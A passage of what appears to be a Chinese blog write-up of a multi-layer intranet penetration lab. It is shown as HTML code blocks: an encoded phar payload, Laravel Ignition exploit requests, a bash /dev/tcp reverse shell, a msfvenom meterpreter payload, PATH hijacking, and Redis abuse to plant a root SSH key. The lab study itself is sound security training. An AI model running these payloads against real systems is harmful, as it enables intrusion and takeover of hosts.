class="keyword">A</span>=<span class="number">00=41=00=36</span>=<span class="number">00=65=00=33</span>=<span class="number">00=31=00=70</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=45=00=37</span>=<span class="number">00</span>=<span class="number">63</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">30</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">69</span>=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00=73=00=62</span>=<span class="number">00=32=00=46</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=74=00=39</span>=<span class="number">00=66=00=58</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">44</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00=69=00=41</span>=<span class="number">00</span>=<span class="number">43</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">58</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">62</span>=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00=51=00=69</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=30=00=38</span>=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00=67=00=36</span>=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00=73=00=62</span>=<span class="number">00=48=00=56</span>=<span class="number">00=74=00=61</span>=<span class="number">00=57=00=35</span>=<span class="number">00=68=00=64</span>=<span class="number">00=47=00=56</span>=<span class="number">00=63=00=51</span>=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00=76=00=59</span>=<span class="number">00=57=00=52</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=59=00=58</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00=30=00=61</span>=<span class="number">00=57=00=35</span>=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00=58=00=45</span>=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00=79=00=62</span>=<span class="number">00=32=00=46</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00=59=00=32</span>=<span class="number">00</span>=<span class="number">46</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00=64=00=45</span>=<span class="number">00=56=00=32</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=57=00=35</span>=<span class="number">00=30=00=49</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">78</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00</span>=<span class="number">74</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=45=00=77</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">69</span>=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=62=00=32</span>=<span class="number">00=35=00=75</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">57</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00=30=00=61</span>=<span class="number">00=57=00=39</span>=<span class="number">00=75=00=49</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=74=00=50</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">79</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">69</span>=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00=62=00=32</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00</span>=<span class="number">72</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">58</span>=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00=35=00=58</span>=<span class="number">00=45=00=64</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">62</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=56=00=79</span>=<span class="number">00=59=00=58</span>=<span class="number">00=52=00=76</span>=<span class="number">00</span>=<span class="number">63</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">78</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00=62=00=32</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00=72=00=52</span>=<span class="number">00=47=00=56</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=61=00=57</span>=<span class="number">00=35=00=70</span>=<span class="number">00=64=00=47</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00=76=00=62</span>=<span class="number">00=69=00=49</span>=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=70=00=37</span>=<span class="number">00</span>=<span class="number">63</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">35</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=69=00=49</span>=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">4</span>B=<span class="number">00=67=00=42</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=62=00=32</span>=<span class="number">00</span>=<span class="number">35</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=61=00=57</span>=<span class="number">00=63=00=69</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=30=00=38</span>=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00=55=00=36</span>=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00=31=00=76</span>=<span class="number">00=59=00=32</span>=<span class="number">00</span>=<span class="number">74</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">63</span>=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00=63=00=52</span>=<span class="number">00=32=00=56</span>=<span class="number">00</span>=<span class="number">75</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">58</span>=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00=68=00=64</span>=<span class="number">00=47=00=39</span>=<span class="number">00=79=00=58</span>=<span class="number">00=45=00=31</span>=<span class="number">00=76=00=59</span>=<span class="number">00=32=00=74</span>=<span class="number">00=44=00=62</span>=<span class="number">00=32=00=35</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=61=00=57</span>=<span class="number">00=64=00=31</span>=<span class="number">00</span>=<span class="number">63</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=46=00=30</span>=<span class="number">00=61=00=57</span>=<span class="number">00=39=00=75</span>=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">78</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00</span>=<span class="number">74</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=63=00=36</span>=<span class="number">00=49=00=67</span>=<span class="number">00=41=00=71</span>=<span class="number">00=41=00=47</span>=<span class="number">00=35=00=68</span>=<span class="number">00=62=00=57</span>=<span class="number">00=55=00=69</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">33</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00=69=00=59</span>=<span class="number">00</span>=<span class="number">57</span>=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=47=00=56</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=79=00=49</span>=<span class="number">00=37=00=66</span>=<span class="number">00</span>=<span class="number">58</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00=69=00=41</span>=<span class="number">00</span>=<span class="number">43</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00=41=00=59</span>=<span class="number">00=32=00=39</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=53=00=49</span>=<span class="number">00=37=00=63</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">78</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">44</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00=36=00=49</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">77</span>=<span class="number">00</span>=<span class="number">2</span>F=<span class="number">00=63=00=47</span>=<span class="number">00=68=00=77</span>=<span class="number">00=49=00=48</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00=35=00=63</span>=<span class="number">00=33=00=52</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00=62=00=53</span>=<span class="number">00</span>=<span class="number">67</span>=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">57</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00=62=00=79</span>=<span class="number">00=42=00=51</span>=<span class="number">00=52=00=44</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00=33=00=59</span>=<span class="number">00=55=00=68</span>=<span class="number">00</span>=<span class="number">42</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=31=00=70</span>=<span class="number">00=59=00=57</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=68=00=69</span>=<span class="number">00=51=00=32</span>=<span class="number">00=64=00=72</span>=<span class="number">00=57=00=44</span>=<span class="number">00=46=00=43</span>=<span class="number">00=55=00=46</span>=<span class="number">00=55=00=78</span>=<span class="number">00</span>=<span class="number">55</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=46=00=72</span>=<span class="number">00=57=00=46</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00</span>=<span class="number">72</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00=31=00=42</span>=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00=44=00=31</span>=<span class="number">00=38=00=59</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00</span>=<span class="number">46</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=54=00=59</span>=<span class="number">00=30=00=49</span>=<span class="number">00=43=00=31</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00=49=00=44</span>=<span class="number">00=34=00=67</span>=<span class="number">00</span>=<span class="number">4</span>C=<span class="number">00</span>=<span class="number">33</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=68=00=63</span>=<span class="number">00=69=00=39</span>=<span class="number">00=33=00=64</span>=<span class="number">00=33=00=63</span>=<span class="number">00=76=00=61</span>=<span class="number">00=48=00=52</span>=<span class="number">00=74=00=62</span>=<span class="number">00=43=00=39</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00=61=00=47</span>=<span class="number">00=56=00=73</span>=<span class="number">00=62=00=43</span>=<span class="number">00=35=00=77</span>=<span class="number">00=61=00=48</span>=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00</span>=<span class="number">4</span>B=<span class="number">00=54=00=73</span>=<span class="number">00</span>=<span class="number">67</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=58=00=68</span>=<span class="number">00=70=00=64</span>=<span class="number">00=44=00=73</span>=<span class="number">00=67=00=50</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00=34=00=69</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=33=00=31</span>=<span class="number">00=39=00=66</span>=<span class="number">00=51=00=55</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=42</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00=64=00=57</span>=<span class="number">00=31=00=74</span>=<span class="number">00=65=00=51</span>=<span class="number">00=51=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00=42=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00</span>=<span class="number">78</span>=<span class="number">00</span>=<span class="number">2</span>B=<span class="number">00=66=00=39</span>=<span class="number">00</span>=<span class="number">69</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00=41=00=51</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00=67=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00=42=00=30</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">58</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00</span>=<span class="number">30</span>=<span class="number">00</span>=<span class="number">4</span>C=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00=52=00=34</span>=<span class="number">00=64=00=41</span>=<span class="number">00=51=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00=42=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00</span>=<span class="number">78</span>=<span class="number">00</span>=<span class="number">2</span>B=<span class="number">00=66=00=39</span>=<span class="number">00</span>=<span class="number">69</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00=41=00=51</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=48</span>=<span class="number">00</span>=<span class="number">52</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00=63=00=33</span>=<span class="number">00=52=00=30</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">58</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00=30=00=44</span>=<span class="number">00=58=00=55</span>=<span class="number">00=76=00=66</span>=<span class="number">00</span>=<span class="number">57</span>=<span class="number">00</span>=<span class="number">2</span>F=<span class="number">00</span>=<span class="number">76</span>=<span class="number">00</span>=<span class="number">4</span>B=<span class="number">00=42=00=33</span>=<span class="number">00=55=00=30</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=51=00=48</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=66=00=78</span>=<span class="number">00=32=00=39</span>=<span class="number">00</span>=<span class="number">68</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">54</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00=30=00=43</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00=52=00=30</span>=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00=51=00=67</span>=<span class="number">00</span>=<span class="number">3</span>D=<span class="number">00</span>=<span class="number">3</span>D=<span class="number">00</span>a&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">5</span>）发送如下数据包，清空对<span class="keyword">log</span>文件中的干扰字符，只留下POC：</span><br><span class="line"></span><br><span class="line">POST /_ignition/<span class="keyword">execute</span>-solution HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">192.168</span><span class="number">.1</span><span class="number">.122</span>:<span class="number">81</span></span><br><span class="line">Content-<span class="keyword">Type</span>: application/<span class="type">json</span></span><br><span class="line">Content-Length: <span class="number">299</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="line">  &quot;parameters&quot;: &#123;</span><br><span class="line">    &quot;variableName&quot;: &quot;username&quot;,</span><br><span class="line">    &quot;viewFile&quot;: &quot;php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">这一步可能会出现异常，导致无法正确清理<span class="keyword">Log</span>文件。如果出现这种状况，可以重新从第一步开始尝试。</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A02//image-20241219214224941.png" alt="image-20241219214224941"></p>
+<figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">6</span>）使用phar:<span class="comment">//进行反序列化，执行任意代码（此时需要使用绝对路径）：</span></span><br><span class="line"></span><br><span class="line"><span class="type">POST</span> <span class="regexp">/_ignition/</span>execute<span class="operator">-</span>solution <span class="type">HTTP</span><span class="operator">/</span><span class="number">1.1</span></span><br><span class="line"><span class="type">Host</span>: <span class="number">192.168</span>.<span class="number">1.122</span>:<span class="number">81</span></span><br><span class="line"><span class="type">Content</span><span class="operator">-</span><span class="type">Type</span>: application<span class="operator">/</span>json</span><br><span class="line"><span class="type">Content</span><span class="operator">-</span><span class="type">Length</span>: <span class="number">210</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;solution&quot;</span>: <span class="string">&quot;Facade<span class="subst">\\</span>Ignition<span class="subst">\\</span>Solutions<span class="subst">\\</span>MakeViewVariableOptionalSolution&quot;</span>,</span><br><span class="line">  <span class="string">&quot;parameters&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;variableName&quot;</span>: <span class="string">&quot;username&quot;</span>,</span><br><span class="line">    <span class="string">&quot;viewFile&quot;</span>: <span class="string">&quot;phar:///var/www/storage/logs/laravel.log/test.txt&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A02//image-20241219214259492.png" alt="image-20241219214259492"></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">做简单的信息收集发现这个主机名有点显眼,我们大概是在容器里面</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A02//image-20241219214534344.png" alt="image-20241219214534344"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /proc/self/cgroup  深入查看,我们确实在docker容器里</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A02//image-20241219214617370.png" alt="image-20241219214617370"></p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">提权</span><br><span class="line">先<span class="built_in">find</span> / -perm <span class="attribute">-u</span>=s -type f 2&gt;/dev/<span class="literal">null</span> 搜索具有SUID或4000权限的文件</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A02//image-20241219214916873.png" alt="image-20241219214916873"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">这个shell二进制文件输出了ps,并且没有绝对路径,尝试更改<span class="variable">$PATH</span>来执行恶意程序，从而获得目标主机的高权限shell</span><br><span class="line">system(<span class="string">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.240.130/1111 0&gt;&amp;1&quot;&#x27;</span>);  用蚁剑的脚本执行发现连不上</span><br><span class="line">先把shell传给msfconsole </span><br><span class="line">生成$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.241 LPORT=6666 SessionCommunicationTimeout=0 SessionExpirationTimeout=0 -f elf &gt;shell.elf</span><br><span class="line">这也连不上,可能作者blog写错了,这个容器是不出网的</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;/bin/bash&quot;</span> &gt; ps</span><br><span class="line"><span class="built_in">chmod</span> 777 ps</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span> </span><br><span class="line"><span class="built_in">export</span> PATH=/tmp:<span class="variable">$PATH</span> <span class="comment"># 将/tmp添加到环境变量中，并且先加载执行/tmp里的程序</span></span><br><span class="line"><span class="built_in">cd</span> /home/jobs</span><br><span class="line">./shell</span><br><span class="line">那就用不了路径劫持提权,因为这个是要生成新shell的</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">想起来有redis的<span class="number">6379</span>端口,试了一下未授权,有未授权,并且我们不是在容器里</span><br><span class="line">redis-<span class="keyword">cli</span> -h <span class="number">192.168</span><span class="number">.240</span><span class="number">.138</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A02//image-20241220170653639.png" alt="image-20241220170653639"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">直接用redis写入rsa私钥,也不需要再传shell了</span><br><span class="line">ssh-keygen -t rsa <span class="comment">#在我本机生成公钥</span></span><br><span class="line">(<span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>; <span class="built_in">cat</span> /root/.ssh/id_rsa.pub; <span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>) &gt; foo.txt <span class="comment">#将公钥导入foo.txt文件</span></span><br><span class="line"><span class="built_in">cat</span> foo.txt | redis-cli -h 192.168.240.138 -p 6379 -x <span class="built_in">set</span> hello <span class="comment">#把foo.txt文件内容写入目标主机的redis缓冲中</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A02//image-20241220171044089.png" alt="image-20241220171044089"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config <span class="built_in">set</span> <span class="built_in">dir</span> /root/.ssh    <span class="comment"># 设置redis的备份路径为/root/.ssh/</span></span><br><span class="line">config <span class="built_in">set</span> dbfilename authorized_keys    <span class="comment"># 设置保存文件名为authorized_keys</span></span><br><span class="line">save    <span class="comment"># 将数据保存在目标服务器硬盘上</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A02//image-20241220171146364.png" alt="image-20241220171146364"></p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ssh</span> <span class="number">192.168.240.138</span> <span class="comment"># 连接</span></span><br><span class="line">拿到的就是root账号,前提是不要,不要直接登录靶机用sudo passwd root改root密码</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">查看一下nginx的配置</span><br><span class="line">这里发现是做了反向代理,我们访问DMZ服务器<span class="number">81</span>端口直接就访问<span class="number">52.20</span>这台机器,所以是不出网的</span><br><span class="line">root@ubuntu:~<span class="comment"># cat /etc/nginx/conf.d/80.conf</span></span><br><span class="line">server &#123;</span><br><span class="line">    listen <span class="number">80</span>;</span><br><span class="line">    server_name www.whopen.com;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">location</span> <span class="title">/ &#123;</span></span><br><span class="line"><span class="title">       proxy_pass</span> https://whoamianony.top/;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">root@ubuntu:~<span class="comment"># cat 